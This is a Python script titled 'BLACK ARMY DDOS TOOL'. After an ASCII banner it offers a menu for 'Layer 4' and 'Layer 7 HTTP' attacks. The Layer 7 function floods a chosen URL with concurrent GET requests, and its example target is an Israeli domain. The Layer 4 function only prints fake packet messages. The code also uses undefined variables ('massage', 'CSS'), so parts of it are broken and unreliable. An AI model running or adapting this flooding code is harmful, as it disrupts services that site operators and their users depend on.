import aiohttp
import asyncio
import time
import os
import random
import sys
from colorama import Fore, Style, init

# Inisialisasi colorama
init(autoreset=True)

def clear():
    os.system("cls" if os.name == "nt" else "clear")
attemps = 0
os.system("clear")
# ============================
#   Typing Animation
# ============================
def typewriter(text, delay=0.002):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(delay)
    print(massage)  # newline

# ============================
#   Banner ASCII
# ============================
def display_header():
    header_lines = [
    Fore.BLACK + "═══════════════════════════════════════════════════════════════════",     
    Fore.YELLOW + "    ",
    Fore.YELLOW + "       ╔══" + Fore.MAGENTA + "         ╔═══════╗" + Fore.GREEN + "    ╔════╗ ╔════╗" + Fore.WHITE + " ╔══╗" + Fore.BLUE + " ╔═══╗     ╔══╗",
    Fore.YELLOW + "       ███ ║" + Fore.MAGENTA + "      ████████ ║" + Fore.GREEN + "   █████ ║█████ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ████ ║    ██ ║ ",
    Fore.YELLOW + "      ██ ██ ║" + Fore.MAGENTA + "     ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ██ ║   ██ ║ ",
    Fore.YELLOW + "     ██ ║ ██ ║" + Fore.MAGENTA + "    ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██  ██ ║  ██ ║   ",
    Fore.YELLOW + "    ██ ╚══ ██ ║" + Fore.MAGENTA + "   ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██ ║ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║ ██ ║ ██ ║ ",
    Fore.YELLOW + "   ███████  ██ ║" + Fore.MAGENTA + "  ██ ║    ██ ║" + Fore.GREEN + " ██ ║ ██═╝ ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║  ██ ║██ ║ ",
    Fore.YELLOW + "  ██ ║       ██ ║" + Fore.MAGENTA + " ██ ╚════██ ║" + Fore.GREEN + " ██ ║      ██ ║" + Fore.WHITE + " ██ ║" + Fore.BLUE + " ██ ║   ██ ██ ║ ",
    Fore.YELLOW + " ██═╝         ██═╝" + Fore.MAGENTA + "████████═╝" + Fore.GREEN + "   ██═╝      ██═╝" + Fore.WHITE + " ██═╝" + Fore.BLUE + " ██═╝    ████═╝ ",
    Fore.YELLOW + "    ",
    Fore.RED + "        ██═╗    ██═╗" + Fore.WHITE + "     ████═╗" + Fore.BLUE + "      ███████ ║" + Fore.YELLOW + "  ██═╗   ██═╗ ",
    Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "    ██ ╔═██ ║" + Fore.BLUE + "   ██ ╔═════╝" + Fore.YELLOW + "  ██ ║  ██ ║ ",
    Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
    Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ████ ║ ",
    Fore.RED + "        ██████████ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║██ ║ ",
    Fore.RED + "        ██ ╔════██ ║" + Fore.WHITE + "   ██████ ██ ║" + Fore.BLUE + "  ██ ║" + Fore.YELLOW + "        ██ ║  ██ ║ ",
    Fore.RED + "        ██ ║    ██ ║" + Fore.WHITE + "   ██ ║   ██ ║" + Fore.BLUE + "   ███████ ║" + Fore.YELLOW + "  ██ ║   ██ ║ ",
    Fore.RED + "        ╚══╝    ╚══╝" + Fore.WHITE + "   ╚══╝   ╚══╝" + Fore.BLUE + "   ╚═══════╝" + Fore.YELLOW + "  ╚══╝   ╚══╝ ",
    Fore.BLACK + "══════════════════════════════════════════════════════════════════",     
    ]
    for line in header_lines:
        print(line)  
    time.sleep(0.0015)  # typing effect
# ============================
#   Layer 4 Stress Tes
# ============================
def layer4_attack(target_ip, duration):
    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
    start_time = time.time()
    while time.time() - start_time < duration:
        port = random.randint(20, 65535)
        psize = random.randint(64, 1500)
        print(Fore.YELLOW + f"[L4] \033[100m {Fore.WHITE}ADMIN-HACK\033[0m {Fore.BLUE} SEN-PACKET {Fore.GREEN} {CSS} {Fore.RED} BYTES TO {target_ip}:{port} {Fore.WHITE}Running ::")
        print(Fore.RED + f"[L4] {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO \033[104m{target_ip}\033[0m:{port} {Fore.GREEN}Running :::")
        time.sleep(0.2)
    print(Fore.GREEN + "\n[✔] Layer 4 attack finished!\n")

# ============================
#   Layer 7 Stress Test
# ============================
async def worker(session, url, stop_time):
    hits = 0
    while time.time() < stop_time:
        try:
            async with session.get(url) as resp:
                await resp.text()
                hits += 1
                print(Fore.CYAN + f"[L7] Request -> {url} ✅")
        except:
            print(Fore.RED + f"[L7] Request failed -> {url} ❌")
    return hits

async def layer7_attack(url, concurrency, duration):
    stop_time = time.time() + duration
    async with aiohttp.ClientSession() as session:
        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
        results = await asyncio.gather(*tasks)
    print(Fore.GREEN + f"\n[✔] Total requests sent: {sum(results)}")

# ============================
#   Menu Utama
# ============================
def main():
    clear()
    display_header()
    print(Fore.MAGENTA + Style.BRIGHT + "=== ⚔️ BLACK ARMY DDOS TOOL ===")
    print(Fore.YELLOW + "1. Layer 4 Attack")
    print(Fore.CYAN + "2. Layer 7 HTTP Attack")
    choice = input(Fore.WHITE + "\nSelect option: ")

    if choice == "1":
        target_ip = input("Target IP: ")
        duration = int(input("Duration (seconds): "))
        layer4_attack(target_ip, duration)

    elif choice == "2":
        url = input("Target URL (ex: http://israel.co.il): ")
        concurrency = int(input("Concurrent connections: "))
        duration = int(input("Duration (seconds): "))
        asyncio.run(layer7_attack(url, concurrency, duration))

    else:
        print(Fore.RED + "\n[!] Invalid choice.")

if __name__ == "__main__":
    main()
